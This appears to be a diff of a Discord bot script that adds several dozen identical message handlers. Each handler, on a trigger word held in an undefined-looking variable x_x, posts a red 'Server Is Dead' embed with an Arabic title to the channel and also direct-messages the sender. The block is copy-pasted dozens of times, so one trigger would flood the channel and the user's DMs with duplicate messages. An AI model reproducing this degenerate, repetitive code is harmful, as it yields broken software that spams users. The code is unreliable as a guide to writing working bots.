+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png')
+   .addField('اـثبات وجـود !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+
+
+
+
+
+
+
+
+
+
+
 
 client.login(process.env.BOT_TOKEN);
